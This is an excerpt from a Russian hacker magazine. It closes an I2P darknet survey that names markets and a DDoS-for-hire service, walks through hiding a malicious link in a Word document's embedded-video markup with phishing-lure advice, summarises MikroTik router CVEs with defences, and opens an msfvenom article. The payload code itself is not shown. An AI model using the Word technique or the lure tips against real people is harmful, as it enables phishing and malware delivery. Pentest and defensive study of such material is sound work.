   Есть и не совсем понятные штуки: например, на сайте rebel.i2p друг друга
сменяют рандомные бес содержательные картинки. Не обходится и без сай‐
тов для взрослых, но на них ничего нового ты не найдешь — особенно если
действительно взрослый.





           На случай, если не купил гир лянды к Новому году

Как пример полезного блога можно привести стра ницу пользователя Миха‐
эля ван Делфта под наз ванием Exotic Security. Там Михаэль делится сек‐
ретами действительно экзотической безопас ности в сети и обсуждает полез‐
ные фичи для программистов. Например, автор блога рассказывает о воз‐
можностях перепрошивки макбуков и про чие занима тельные вещи.





                    What u know bout securtiy, bro?!

Лю бая андерграундная сеть прос то обязана иметь свою борду, где люди
могут общаться на любые темы. I2P не изменяет этим традици ям и представ‐
ляет нам местечко под наз ванием F*ck Society. Здесь есть под разде лы
по разным темам, в том числе одна из них — это представительство Runion.
Есть треды о запрещен ных веществах, насилии, политике и прочих обя‐
зательных для даркнета темах.





                    Здесь не сажают за репосты

Продолжая рассматривать анонимные социальные сети, мы натыкаемся
на Onelon. Это некий «Фейсбук» без огра ничений: писать можно что угодно,
кому  угодно и зачем  угодно. Поклонникам  onion‐пространства Onelon
известен уже как минимум несколько лет. I2P‐версия почти ничем не отли‐
чается: схожие треды, схожие комментарии. Правда, onion‐версия гораздо
более популярна.





Об щение
Из полезных сервисов, которые есть в I2P, стоит выделить vPass, который
помогает придумать пароль под определен ный домен, и EasyGPG, который
делает тебе личный ключ GPG. По сути, почти все практичные ресурсы I2P
можно без труда найти в .onion и даже в клирнете.
  Например, серверы Jabber типа Echelon и анонимные децентрализован‐
ные почтовики вроде I2P Bote в наше время удивят лишь ну уж совсем нович‐
ков. Но знать об их сущес твовании полезно.





Торговля
Ну и конечно, в I2P есть свои рын ки. Там, где в Onion Hydra, здесь — nvspc.
Система оплаты и получения товара у них схожая, и к обоим есть доступ
из клирнета. Отметим, что nvspc может выступать и в роли криптовалютной
биржи. Также стоит упомянуть Garden — но это вовсе не райский сад, а тор‐
говая площадка, схожая с WayAway в .onion.





                          Hydra на минималках

По части искусства в I2P тоже кое‐что есть, например стри минговая плат‐
форма StreamRadio и «Радио Анонимус». Но кому нужна анонимизированная
музыка — это вопрос нетривиальный.


Катало ги
В I2P име ется собственная «Русская I2P Wiki». Цель этой вики — способство‐
вать развитию проекта I2P, поз воляя пользователям анонимно вносить прав‐
ки в существующие статьи, чем‐то напоми нающие любимый в народе «Лурк».
Среди прочего есть страница со ссылками на интерес ные ресурсы.
  Не стоит забывать и об Eepsites — катало ге ссылок. Каталоги в I2P мог‐
ли бы быть полезным ресурсом, но, к сожалению, большинство ссы лок
нерабочие.





                        Русско язычная I2P Wiki


Книж ные раз валы
Flibusta тоже разместилась в I2P и успешно работает. Однако, помимо при‐
вычных нам библиотек с миллиона ми книг, I2P предлагает и более узкопро‐
фильные. Например, вла дельцы ресурса «Экстремальная химия» кол лекци‐
онируют руководства, опыты из которых можно (но не нужно!) повторять дома
или в гараже. В качестве образовательно‐раз влекательного чтива — вполне
интересно. «Мир фэн тези» — тоже что‐то вроде узконаправлен ной биб лиоте‐
ки: если ты любишь погружаться в волшебные миры, то I2P тебя здесь
порадует вдвойне.





                       Экстремальная химия


Файлооб мен
В I2P огромное количество файлооб менни ков. Действительно, где можно
обмениваться файлами настолько же безопас но и анонимно, как здесь?
Наверное, только в реальной жиз ни — да и то не факт. В I2P есть и всем
известный «Схоронил» и множество андергра ундных местечек вроде Serien.
Обмениваются в том числе и через торренты — взять хоть зеркало RuTor
или Public Torrent Tracker. Есть даже зеркало «Правос лавного торрента».





                             TorNet? Torrent!


Криминал
Если в клирнете и в .onion полно хакерских и кардерских форумов, мошен‐
ников и скамеров, то в I2P в этом плане все скромно. Даже самые большие
onion‐ресурсы криминаль ной тематики зачастую не хотят уходить в I2P, пред‐
почитая держать для пользователей более легкие пути доступа. В I2P кри‐
минальные ресурсы соз даны для совсем хардкорных товарищей, и найти
такие места неп росто.
  Например, ресурс Armada предос тавляет услуги по DDoS‐атакам, взлому
и подобному. Впрочем, сами авторы утверждают, что все это блеф, вымысел
и шутка, — проверять мы не ста ли.





                    I2P без цензуры, но мы в клирнете...

По иным хакерским ресурсам не поймешь, обитают там гении маскировки
или же какие‐то случайные люди, не имеющие отношения ко взлому. Нап‐
ример, Project Mayhem вроде бы и предос тавляет какие‐то услуги, но внешне
больше похож на календарь майя. Французский хакерский форум BumpTeam
очень напоминает практическую работу первокурсни ка. Других ресурсов кри‐
минальной направленности, к сожалению, в I2P нам найти не удалось.





                    Верните мне мой 2012‐й


Криптовалюта
С биткойнами и криптой в целом у I2P отношения складываются куда лучше,
чем с другими вещами. К примеру, в I2P дос тупен Zcash, а также сущес твует
еще очень много кошельков и обменников с трей динг‐платформами. Мы
не пользовались ни одним из них, а потому настоятельно рекомендуем сто
раз подумать, прежде чем делать в I2P криптовалютные транзакции.
   Кстати, есть даже сайт, позволя ющий вывес ти биткойны на вир туальную
карту VISA. В данный момент он недоступен, но сама идея интересная.


Про чее
В I2P немало ресурсов, дос туп к которым есть и из клирнета. Например, спи‐
сок прокси для Telegram или РосПравосудие.
  Закончить  перечень  самых  интересных  и  доступных  ресурсов  I2P
хотелось бы официальным сайтом I2P Project.





             И мы вернулись к тому, с чего начали


ВЫВОДЫ
Пользоваться I2P непросто, и, как следствие, эта сеть малопопулярна в срав‐
нении с сервисами Tor. I2P предос тавля ет более продуманный механизм ано‐
нимизации, но при этом не может похвастать ся богатс твом контента.
  Получается, что I2P пока что не для раз глядывания сайтов, а именно
для анонимной передачи данных и скрытия трафика от посторонних глаз.
В этом плане он если и не идеален, то как минимум лучше, чем Tor или VPN.
  Существование никому не подконтрольной и децентрализованной сети —
это важно, даже если лично для тебя в ней нет ничего ценного. Поэтому ска‐
жем спасибо тем, кто продолжает под держивать I2P, и заглянем сюда снова
через пару лет.
ВЗЛОМ





ДЫРЯВЫЙ


                                                                                                 8bit
                                                                                             vegelin47@mail.ruWORD

КАК СПРЯТАТЬ БОЕВУЮ НАГРУЗКУ
В ДОКУМЕНТЕ




В современных версиях Microsoft Oﬃce документы по умол‐
чанию сохраняются в формате, осно ван ном на Oﬃce Open
XML, однако Microsoft не во всем следует открытому стан‐
дарту. Вариант Microsoft часто называют MOX, Microsoft
Open XML. Он содержит некото рые вольности, создающие
угрозы безопас ности. Сегодня мы подробно разберем одну
из них — так и не закрытую на момент написания статьи.


Почти сразу после публикации чернового варианта OOXML началась битва
за его стандартизацию. Вот краткая хронология версий.
 • 2006 год — ЕСМА‐376, первая версия;
 • 2008 год — ISO/IEC 29500:2008 Transitional, переходная вторая версия;
 • 2008 год — ЕСМА‐376, part 2, и ISO/IEC 29500:2008 Strict, финальная вто‐
   рая версия;
 • 2011 год — ЕСМА‐376, part 3, и ISO/IEC 29500:2011, третья версия;
 • 2012 год — ЕСМА‐376, part 4, и ISO/IEC 29500:2012, четвертая версия;
 • 2015 год — ЕСМА‐376, part 5, и ISO/IEC 29500‐3:2015, пятая версия
  OOXML.

В 2016  году появились дополнения  к  пятой версии:  ISO/IEC 29500‐
1:2016 и ISO/IEC 29500‐4:2016. Работа над стандартом продол жается, а Mi‐
crosoft допускает все больше проприетарных осо бенностей его реализации
в новых версиях Oﬃce. Хуже того: компания не признает старые уязвимости,
оставляя их в новых продуктах. Описываемая в статье дыра появилась в Mi‐
crosoft Oﬃce 2013 и сохранилась вплоть до Oﬃce 2019.


             INFO

                     ECMA‐376 включает в себя три различные спе‐
                    цификации для каждого из трех основных типов
                      документов Ofﬁce — WordprocessingML для тек‐
                        стовых документов, SpreadsheetML для электрон‐
                      ных таблиц и PresentationML для презентаций.
                Мы будем использовать WordprocessingML.


Я возьму на себя смелость ука зать на два кри тичных с точки зрения безопас‐
ности недостатка MOX, унаследованных от OOXML:
 • возможность легкого редактирова ния внут ренней структуры документов;
 • отсутствие проверок на злонамеренную модификацию.

По сути, MOX и OOXML — это XML в ZIP. Это отличный hacker‐friendly‐формат,
поскольку найти и заменить свойства объектов в нем исключительно просто
даже без использования HEX‐редакторов и прочих спе цифичес ких утилит.
Достаточно встроенной в Windows поддержки ZIP и «Блокнота». Весь код лег‐
ко читается глазами и пра вится, как текст. Ни сверки контрольных сумм,
ни каких‐то иных специфических проверок при этом не выполняется. Word
лишь проверяет целостность документа, которая не нарушается при под‐
менах с соблюдением пра вил синтаксиса.
   Если в документ вставлен объект, загружа емый с внешнего ресурса (нап‐
ример, ссылка на видео), то в соответс твующей секции создается легко чита‐
емая  (и  так же прос то изменяемая) гиперссылка. Это прямая дорога
к фишингу или запуску тро янов в один клик.


           WARNING

                        Статья  предназначена  для  профессиональных
                      пен тесте ров и сотрудников служб информацион‐
                      ной  безопасности.  Ни  автор,  ни  редакция
                      не несут ответственности за любой возможный
                        вред, причинен ный с примене нием приведенной
                    информации.



ОПИСАНИЕ УЯЗВИМОСТИ
В базе уязвимостей MITRE есть мно го одно типных записей вида: «Microsoft
Oﬃce... do not properly validate record information during parsing of (Excel
spreadsheets / Word documents, Power Point presentations)... which allows re‐
mote attackers to execute arbitrary code or cause a denial of service (memory cor‐
ruption) via a crafted ﬁle)». Проще говоря, проблемы парсинга XML в MS Oﬃce
неисчерпаемы, как атом.
  Я уже рассматривал одну из них в статье «Pass the Hash через Open XML».
Сейчас мы реализуем другую ата ку, также слегка поковыряв недра файла
Word.
  Начиная с Oﬃce 2013 в OOXML стал доступен класс WebVideoProperty. Он
появляется в разметке при вставке в документ онлайн‐видео и описывает
параметры его воспроизведения через набор атрибутов.
  Нас будет интересовать атрибут embeddedHtml. Он нужен для вставки
внешних объектов и содержит ссылку на них (например, на видеоролик
YouTube). Из‐за того что этот параметр «зна ет», из какого закоулка интернета
тянуть картинку видеозаписи, его нельзя опустить при парсинге.


ИЩЕМ ОБЪЕКТ ПОДМЕНЫ
Давай выполним простую атаку подмены и пощупаем уязвимость своими
руками. Запускаем Word (требуется версия 2013 или выше, так как нам нужна
полная поддержка ISO/IEC 29500 Strict) и идем в меню «Вставка».





В появившемся окне в строчке напротив YouTube я просто вписал слово
«видео» и выбрал первую понравившуюся картинку. Вставка ролика отоб‐
разилась на листе докумен та типичной превь юшкой.
  Сохраним и закроем его. Обра ти внимание, что размер файла почти
не изменился. У меня он занимал считаные килобай ты. Значит, вставленное
видео не сохраняется локально, а всегда запрашивается из интернета
по известной ссылке.
  Следующим шагом нам надо заглянуть в нутро документа. Меняем рас‐
ширение .docx на .zip, открываем любым архивато ром и видим содержимое.
  В папке \word нам нужен файл document.xml. Разархивируем и откроем
его на редактирование (подойдет и прос той Notepad, хотя Notepad++ удоб‐
нее из‐за подсветки синтаксиса).
  В скудной документации о клас се WebVideoProperty указано, что в теле
документа он именуется wp15:webVideoPr. Находим эту секцию и смотрим ее
содержание.





             wp15:webVideoPr в структуре файла document.xml

Конструкция изначально выглядит следующим образом:





Атрибут embeddedHtml содержит iframe  YouTube, который при замене
на HTML или JavaScript будет выполняться. А это не что иное, как уязвимость!


ЭКСПЛУАТАЦИЯ УЯЗВИМОСТИ
Если внимательно посмотреть на содержимое секции, то можно заметить,
что символы < и > заменены на &lt; и &gt;. Это способ записи символьных
данных без использования раз дела CDATA. Они ука зывают парсеру на то, что
эта часть документа не содержит разметки. Так же мы должны поступить
со всеми нашими спецсимво лами.
  Еще стоит отметить, что все парамет ры отделены друг от друга точкой
с запятой. Если мы пропус тим хотя бы одну из них, то при откры тии документа
произойдет ошибка про верки целос тности файла. Правда, Word облегчает
задачу, подсказывая, где имен но мы ошиб лись (см. скриншот).





       Ошибка Word при неправильном син таксисе document.xml

Давай удалим все, что находится меж ду кавычками, и попробуем вставить
свой HTML‐код. Сначала добавим отоб ража емую часть ссылки:


<H1>xakep</H1>

В нашем случае она будет выглядеть следующим образом:




Теперь подменим исходную ссылку на ролик с YouTube своей. Например, заг‐
рузим какой‐нибудь файл на компьютер жертвы.
  В  качестве  «вредоносного сервера»  я поднял  дис трибутив  Ubuntu
16.4 с Apache2 и положил в каталог /var/www/html два файла: условного
зловреда и простенькую HTML‐стра ницу со ссылкой на него. IP‐адрес сер‐
вера в локальной сети — 192.168.1.20.
  Далее нам нужно все это указать в embeddedHtml:





Теперь сохраним наш измененный файл и запустим его.
  Для первой проверки я подготовил имитацию жертвы — компьютер с Win‐
dows 10 (1803) и MS Oﬃce 2016 Professional Plus VL x86, который мы и будем
атаковать.
  После запуска файла не видно ничего необычного. Откры вается документ
со вставленным видеоро ликом. При наведении курсора отображается кор‐
ректная ссылка на него. Однако, если нажать на воспроизведение, вмес то
видео отобразится наша ссылка.





             Действие после активации воспро изве дения

В реальном сценарии вмес то xakep лучше написать что‐то более под‐
ходящее для фишинга. Например, Click to begin playback.
  Может быть, со времен Oﬃce 2016 уяз вимость уже закрыли? Давай про‐
верим, сработает ли наш трюк в Microsoft Oﬃce Pro Plus 2019 и Windows 10
(1803).
  Открываем тот же файл и пробуем запус тить видео. Слово «хакер» так же
подчеркнуто и выступает в качес тве ссылки. При клике на него откры вается
Edge с нашей страницей на «злом сервере». На ней все та же ссыл ка для заг‐
рузки зловреда.





  Открытие фишин говой ссылки при клике в окне предпросмотра виде оро‐
  лика

Для большей наглядности я записал корот кий ролик с демонстрацией атаки.
Кстати, его тоже можно использовать как приманку и вставить в фишинговый
файл Word (рекурсия!).





ПРИМЕЧАНИЯ
Стоит уточнить ряд важных моментов. Трюк работает, если пользователь
просто нажимает левой клавишей мыши на кнопку Play в превьюшке встав‐
ленного в документ ролика. Так делает большинство, но продвинутые могут
кликнуть с зажатой клавишей Ctrl. В этом случае начнется воспроизве дение
видео. Почему так происходит?
  При нажатии левой кнопки мыши с клавишей Ctrl и без нее Word обра‐
щается к разным секциям документа. В первом слу чае он считывает под‐
мененную ссылку из word\document.xml и предлагает выпол нить переход
по ней. Во втором — считывает оригинальную ссылку на видеоролик из word\
_rels\document.xml.rels и запускает его.
   Если же подменить URL в обеих секциях, фишинговая ссылка будет отоб‐
ражаться при наведении курсора мыши на превьюшку. Такой грубый вариант
атаки сработает толь ко с самыми невнимательными пользовате лями.
   Также заметь, что при нажатии левой кнопкой мыши с Ctrl откроется бра‐
узер, установленный по умолчанию. Если же прос то кликать, то (вредоносная)
ссылка всегда будет открываться в бра узере. Это еще один вектор атаки.
  В зависимости от версий ОС и Oﬃce, а также настроек безопас ности
у жертвы могут сработать дополнительные компоненты защиты. Например,
Oﬃce 2010 ограниченно поддерживает OOXML. Он предложит разрешить
редактирование документа преж де, чем позволит кликнуть на превьюшку.
В Windows 7 IE выдаст предупреждение при открытии ссылки.





                  Предупреждение в Windows 7

С Windows 10 наблюдается совсем другая картина. В дефол тных настройках
(а у потенциальной жертвы они, как пра вило, такие) ни IE, ни Edge ни о чем
не предупреждают. Ссылка открывается без дополнительных действий.
Отсюда можно сделать парадоксальный вывод о том, что новая ОС оказалась
более уязвима к таким атакам.
  Для дополнительной проверки я откры вал файл с изме ненной ссылкой
в следующих офисных пакетах:
 • Open Oﬃce 4.1.6;
 • Libre Oﬃce 6.1.3;
 • Soft Maker Oﬃce 2018.

Все они официально поддерживают OOXML, при чем в точном соответствии
со стандартом ISO/IEC 29500. Ни один из них не подвержен рассмотренной
уязвимости, посколь ку все вольности Microsoft игнорируются. Фактичес ки
пользователь оказывается лучше защищен бла года ря отсутствию поддержки
проприетарной функции вставки онлайн‐видео... но ведь, кроме роликов,
в документы можно вставлять и дру гие объекты. ;‐)


ВЫВОДЫ
В этом примере мы рас смотрели, как модифицировать XML‐разметку офис‐
ных документов, чтобы выполнить подмену ссылки и подсунуть жертве злов‐
реда. Вместо пугающей надписи «Хакер» можно подоб рать что‐нибудь более
привлекательное. Например, указать, что для воспроизведения ролика необ‐
ходимо скачать плагин или обновить плеер. Красочно оформляем страницу
загрузки, внушаем, что все безопасно, и дело в шляпе. Белой или черной —
решать тебе.


        WWW

                    •Подробнее про OOXML
                    •Описание класса WebVideoProperty
                    •Отличия OOXML и MOX
ВЗЛОМ

   ОПАСНЫЙ
    MIKROTIK





                                                                       Лев Герасимов
                                                                                            lev.gera@gmail.com





РАЗБИРАЕМСЯ В УЯЗВИМОСТЯХ
ПОПУЛЯРНЫХ РОУТЕРОВ




В роутерах, которые числились среди лучших и часто при‐
меняются в индус триальных целях, внезапно одна за другой
обнаруживают ся серьезные уязвимости. В этой статье мы
рассмотрим последние серьезные дыры, поищем причины
их возникновения и расскажем, как обезопасить себя.


Если заглянуть в базу CVE, то ока жется, что в продуктах MikroTik за всю исто‐
рию было найдено восемнадцать уязвимостей. Восемь из них приходятся
на 2018 год и шесть — на 2017‐й. Получа ется, что более 77% уязвимостей
MikroTik обнаружены за два пос ледних года.





  Распределение выявленных уяз вимостей MikroTik в процентном соот‐
  ношении по годам

Может сложиться впе чатление, что компания MikroTik существу ет сравнитель‐
но недавно. Но это не так. Фирма MikroTik на три года старше, чем сам проект
CVE: она основана в 1996 году.


НЕМНОГО О MIKROTIK
Если ты впервые слышишь о MikroTik, то знай: название этой компании не свя‐
зано с нервными тиками. Впро чем, от количества настроек, которые пре дос‐
тавляет ее продукция, они все же поначалу случаются — в основном у поль‐
зователей, не име ющих специальной подготовки.





                       RouterOS во всей красе

MikroTik — это латвийский производитель сетевого оборудования. В ком‐
пании разрабатывают как железо, называемое RouterBOARD, так и опе раци‐
онную систему для него — RouterOS. Обычно эти две сос тавляющие просто
называют MikroTik.
   Эти продукты отно сятся к полупрофес сиональ ному сегменту, который
занимает нишу между домашними маршру тизатора ми типа D‐Link, TP‐Link,
Asus и профессиональным обо рудовани ем типа Cisco и Juniper. В сравнении
с домашними роутерами про дукты MikroTik отличают ся значительно большим
числом функций.





  RouterBOARD hAP AC lite — младший представитель продуктовой линей‐
   ки. Но даже у него мас са возможностей

С профессиональным оборудованием их сравнить по‐прежнему непросто,
но низкие цены делают роутеры MikroTik привлекательными для малого
и среднего бизнеса и даже для некоторых крупных сетевых провайдеров.
В последнее время роутеры MikroTik мож но встретить и дома — в основном
у тех, кто считает их настройку прекрасной воз можностью, а не лишней голов‐
ной болью (то есть у читателей «Хакера»).


ПЛЮСЫ И МИНУСЫ MIKROTIK
Поразительное количество воз можнос тей — не единс твенное, что отличает
продукцию MikroTik. Эти роутеры также славятся надежностью и стабиль‐
ностью в работе. Как пра вило, хорошо нас троенное и протес тированное обо‐
рудование этого производителя работает дол го, ста бильно и бесперебойно
(при отсутствии проб лем с питанием). Также среди плюсов — наличие встро‐
енного скриптового языка, который поз воляет описывать, как роутер дол жен
реагировать на возникновение проблем. А еще у MikroTik есть технология
WatchDog, которая спасает при зависа нии маршрутизатора.
  Добавь  сюда  удоб ную  систему  конфигурирования,  общедоступную
документацию в виде вики и периодические обновления RouterOS, которые
можно ставить без всякой авто риза ции. Или вот еще важный момент: дос‐
таточно изучить RouterOS, и ты сможешь настро ить роутер MikroTik из любого
ценового сегмента и даже поставить его на сервер x86.
  Минусы тоже есть, и именно из‐за них MikroTik не конкурент Cisco и Ju‐
niper. Среди недостатков: отсутс твие резервирования, трудности маршру‐
тизации больших объемов трафика (более 10 Гбайт/с) и отсутствие шиф‐
рования по ГОСТ, которое важно для госструктур.
   Также  оборудование   MikroTik  не  очень  подходит   в   качестве
многофункциональных устрой ств. Ты спросишь: а как же все раз говоры
про огромные возможности нас тройки? Да, функциональность MikroTik дей‐
ствительно очень широка, одна ко получить все и сразу в одном устройстве
и обеспечить при этом стабильную работу выходит далеко не всегда.
   Ну и конечно, не сто ит забывать про тру доемкость нас тройки (если ты
не сисадмин, то даже прос тые вещи придется делать по ману алам), отсутс‐
твие корпоративной поддержки и малое количес тво специалистов. Все
это пока что мешает марке раз вивать ся даль ше своего нынешнего рынка.
А теперь репутацию под портили и уяз вимости.


УЯЗВИМОСТИ И ВЗЛОМЫ
Последнее время роутерам MikroTik пришлось порабо тать на износ: вдобавок
к их основным функциям им приходилось майнить криптовалюту, становиться
частью ботнетов, перехватывать тра фик и заражать себе подобных. Всему
виной — новые уязвимости, найденные в продукции MikroTik.
  Конечно, все дыры уже запатчены произво дителем, но поговорить о них
стоит. Во‐первых, такой внезапный всплеск интересен сам по себе, а во‐вто‐
рых, большинство пользователей  MikroTik не торопятся самостоятельно
обновлять прошивку. Нашелся даже «Робин Гуд», который взламывал роуте‐
ры, чтобы обновить прошивку. Его усилиями было спасено около ста тысяч
роутеров, к тому же удалось дать проблеме дополнительную огласку. Однако
надеяться на одного грейхета с добрыми намерениями — это не выход.
   Уязвимости, как и всег да, можно разделить на критические и не очень.
Начнем с наиме нее критических. Такими уязвимостями можно считать тройку,
выявленную в августе командой Tenable Research. Речь идет об уязвимостях
с идентификаторами CVE‐2018‐1157, CVE‐2018‐1159, CVE‐2018‐1158. Все они
связаны с повреждениями памяти, а эксплуатировать их может только авто‐
ризованный пользователь.
   CVE‐2018‐10070 и CVE‐2018‐1156 хоть и считаются критическими, но по
сравнению с другими серьезной опасности не представляют. CVE‐2018‐
1156 была обнаружена в тот же месяц и той же командой, что и предыдущие
три уязвимости. Проб лема связана с механиз мом обновле ния RouterOS.
При ее эксплуатации авто ризованный злоумышленник может исполнить вре‐
доносный код.
   Эксплуатация CVE‐2018‐10070 позволяет неавторизованному злоумыш‐
леннику исчерпать ресурсы ЦП и ОЗУ, отправляя запросы на порт FTP.
Результатом будет перезагрузка без надлежащего процесса отключения.
Хорошего мало, но жить можно.


        WWW

                  Желающих разобраться с этими уязвимостями
                      поближе приглашаем заглянуть в репозиторий
                         Tenable Research, где есть готовые PoC: CVE‐
                        2018‐1157, CVE‐2018‐1158, CVE‐2018‐1159, CVE‐
                       2018‐10070, CVE‐2018‐1156.
                    Внимание! Ссылки приводятся исключительно
                        в ознакомительных целях и не являются при‐
                     зывом к нарушению статьи 272 УК РФ.


Переходим к самому интерес ному. Из всех выявленных в этом году уязвимос‐
тей последние три наибо лее опас ны. Что дела ет их такими опасными?
Во‐первых, то, что для их эксплуата ции не требуется аутентификация. А это
значит, что круг злоумышленников, способных эксплуатировать уязвимости,
значительно расширяется. Во‐вторых, в отличие от CVE‐2018‐10070, которая
приводит к перезагрузке маршрутизатора, эксплу атация этих уязвимостей
может привести к похищению пользовательско го тра фика и исполнению вре‐
доносного кода.
  Использование CVE‐2018‐10066 позволя ет перехватывать клиентский тра‐
фик. Уязвимость связана с отсутствием про верки сертификата OpenVPN.
Поскольку выявить эксплуатацию этой уязвимос ти почти нереально, широко‐
го обсужде ния она не получила. Чего не скажешь об остальных.


             INFO

                      Эксплуатация CVE‐2018‐10066 — это атака типа
                   Man in the Middle. Поскольку MikroTik не проверя‐
                         ет   сертификаты,   злоумышленник   способен
                       выдать себя за вредоносный сервер OpenVPN.
                     Подобное поведение способно принести плоды,
                          когда злоумышленник смог перехватить процесс
                     обмена ключами (рукопожатие) или подобрать
                         закрытый ключ сессии.


Первой в хакерскую копилку в этом году упала CVE‐2018‐7445. Это уяз‐
вимость типа RCE, которая поз воляет злоумыш леннику получить доступ
к роутеру и исполнять вредонос ный код. Ата ка начинается с отправки запроса
на сессию NetBIOS. Функцию безопас ности, которая не позволяет исполнять
код из области памяти, уда лось обойти методом возвратно‐ориентирован‐
ного программирования (ROP). В результате удалось отметить область
памяти как пригодную для записи и исполнения.
  В основе CVE‐2018‐7445 — уязвимость, основанная на классической ата‐
ке с переполнением буфера. В данном случае перепол нению буфера под‐
вержен сетевой протокол SMB, используемый для удаленного доступа к фай‐
лам. Опасной атаку делает возможность исполнения вредоносного кода.


        WWW

                 О  технической  эксплуата ции  этой  уязвимости
                   можно было бы написать отдельную статью. Тем,
                         кто хочет разобраться в воп росе более детально,
                      рекомендую перевод статьи Питера Брайта на эту
                       тему или первоисточник. И конечно, для изучения
                      доступен PoC.


Технология ASLR дол жна была предотвратить эту угрозу, но в MikroTik с 32‐
битной адресацией ASLR оказалась подвержена взлому методом перебора.
  Были разговоры, что эта уязвимость использовалась в изощ ренных шпи‐
онских атаках командой Slingshot. Прямых подтверждений никто не нашел,
но возможность такой эксплуата ции была. Целевые компьютеры заражались
при подключении через утилиту WinBox (штат ный конфигуратор MikroTik).
Через нее с зараженного роутера просачивались вредонос ные библиоте ки
вируса, в результате чего злоумышленники захватывали сис тему.


ПРОБЛЕМЫ С WINBOX
Последняя из серьезных уяз вимос тей MikroTik в этом году — CVE‐2018‐14847.
И она тоже непосредственно свя зана с WinBox. «Опять этот WinBox!» — ска‐
жешь ты. На самом деле прошлая уяз вимость отно силась к клиентской прог‐
рамме косвенно: для нее WinBox был только вектором заражения, с помощью
которого вредоносный код распростра нялся на конечный компьютер.
  Новая уязвимость свя зана не с самим WinBox, а с протоколом взаимодей‐
ствия между конфигуратором и RouterOS. Атака строится на знании протоко‐
ла: злоумышленнику нужно вместо процеду ры аутентификации устроить под‐
мену пакетов. Это позволяет добыть базу данных пользователей роутера,
дешифровать ее и получить дос туп к системе.


             INFO

                       Уязвимость свя зана с тем, что до авторизации
                       пользовате ля RouterOS обрабатывает входящие
                        пакеты. После обработки входящие пакеты филь‐
                         труются в зависимости от привилегий отправите‐
                           ля. Из‐за некоррек тной работы фильтра у зло‐
                   умышленников  появилась  возможность  редак‐
                        тировать файлы в файловой системе. PoC дос‐
                        тупен по ссылке.


Собственно, поэтому‐то все атаки на WinBox происходили практически
по одному и тому же сценарию. Пос ле пары неудачных попыток аутентифика‐
ции злоумышленник проникал в систему, изменял некоторые настрой ки мар‐
шрутизатора, а через час пос ле вто ричной авто риза ции роутер уже становил‐
ся полностью ему подконтрольным.
  Первоначально эксперты присвоили этой уязвимости средний статус
опасности. Все изменилось в момент, когда специалисты из Tenable Research
рассказали на конференции DerbyCon 8.0 о новом методе атаки. С помощью
нового метода можно не только прочитать файлы из памяти, но и записать их
в память, вызвать переполнение буфера и выпол нить произвольный код.


ЧЕМ ОПАСНЫ УЯЗВИМОСТИ
Вопрос, конечно, тривиальный: если твое устройство пострадает от атаки, то
оно, скорее всего, будет работать некорректно, а ты потеря ешь воз можность
авторизоваться в системе. Однако сущес твуют и другие варианты раз вития
событий.
  Владелец роутера может просто не замечать существенных изменений
в работе устройства, тогда как роутер начнет жить двойной жизнью и втихую
работать на мафию. :‐)
  Один из наиболее безобидных примеров — скрипт Coinhive, который поз‐
воляет злоумышленнику майнить криптовалюту на роутерах MikroTik через
браузеры пользователей. К сожалению, опасных примеров больше.
  Один из наиболее злых охотников на роутеры MikroTik — ботнет Hajime,
который массово сканирует сеть в поисках устрой ств с версией прошив‐
ки 6.38.4 и ниже. Эта версия уязвима перед ата кой Chimary Red. Эксплоит
способен удаленно выполнять код в командной строке роутера, а затем
извлекает базу данных логинов и паролей и под конец меня ет логи.
   Стоит упомянуть и о зловреде VPNFilter. К технологии VPN он никакого
отношения не име ет, но зато умеет подслушивать трафик, внедрять в него
вредоносный контент, выводить роутеры из строя, а также извлекать поль‐
зовательские пароли и другую важ ную информа цию. Оборудование MikroTik
снова было в списках пос традавших.


КАК СЕБЯ ОБЕЗОПАСИТЬ
В первую очередь, конечно, нужно не забывать ставить новые версии
RouterOS. Как правило, все проблемы воз никают из‐за того, что администра‐
тор маршрутизатора поп росту не утружда ет себя своевременным обновле‐
нием ПО или владелец не в курсе, что это необходимо. Новые версии
по большей части выпус кают  как  раз, чтобы закрыть очередную дыру
или исправить баг. Ставь их!
   Вторая по важности защитная мера — менять стандартные имена
и пароли учетных записей. Тут, я думаю, ничего объяснять не нужно. Понятно,
что заполучить учетку admin с паролем admin будет многократно проще, чем,
к примеру, учетной записи GriBorryij с двенадцатиз начным паролем.
   Третья мера — отклю чать неиспользуемые сервисы и службы. Каждый
активный сервис в будущем может стать экс плуатируемой уязвимостью.
Поэтому, если сервис не используется, смело выключаем  его. Стоит
подумать и о возможности перевода сервисов на нестандартные порты.
  И наконец, не стоит забывать о настройке файрво ла. Первым делом мак‐
симально ограничь цепочку INPUT и добавляй в нее только доверенные IP‐
адреса. В дальнейшем пос тарайся исключить вза имодействие с допол‐
нительными сетями, если это не требуется.


ВЫВОДЫ
Корни проблем с роутерами MikroTik, на мой взгляд, кроются именно в их
достоинствах и уникальнос ти их ниши на рынке. Эти продукты дешевы
и надежны, а значит, их час то берут с целью сэкономить. Скорее все го,
сэкономят и на поддержке. Специалисты даже шутят, что клиенты после пер‐
вой настройки MikroTik больше никогда не звонят.
  ВЗЛОМ

   ЭНКОДЕРЫ
   MSFVENOM





   German Namestnikov                                                              Темирлан Мардан
     OSCP, OSCE, SLAE                                                                                  OSCP/Digital Forensics
german.namestnikov@gmail.com                                                                      temirlan.mardan@gmail.com





     РАЗБИРАЕМСЯ С КОДИРОВАНИЕМ
          БОЕВОЙ НАГРУЗКИ
      ПРИ БИНАРНОЙ ЭКСПЛУАТАЦИИ





   Генерация полез ной нагрузки — неотъемлемая часть экс‐
   плуатации. При использовании модулей Metasploit пейлоад
   генерируется  автоматически,  достаточно  выбрать  тип
   и задать некоторые переменные. В этой статье мы попробу‐
   ем разобраться с ролью энко деров в бинарной эксплуата‐
   ции и рас смотрим несколько реальных примеров энкодинга
   на боевых экс плоитах.


   Обычно модули скрывают от пользователя детали реализации полезной наг‐
    рузки. Ситуация немного меняется, когда дело доходит до необходимости
    воспользоваться эксплоитом, для которого не существу ет модулей Metasploit,
    но есть, например, PoC на Python или любом другом язы ке.
     В таких обстоятельствах очень полезным инстру ментом может оказаться
    утилита msfvenom, входящая в сос тав Metasploit Framework, которая умеет
    генерировать полезные нагрузки на осно вании заранее определенных шаб‐
    лонов. Эта утилита настолько удобна, что сводит процесс генерации пей‐
    лоада к все тому же выбору типа и заданию необходимых переменных.
     Одна из опций при генера ции шелл‐кода с msfvenom — это выбор энко‐
    дера. Шелл‐кодинг — не самая прос тая для понимания тема, поэтому даже
    такая вспомогательная часть это го процесса, как энкодинг полезной наг‐
    рузки, порождает огромное количес тво мифов и заб луждений.


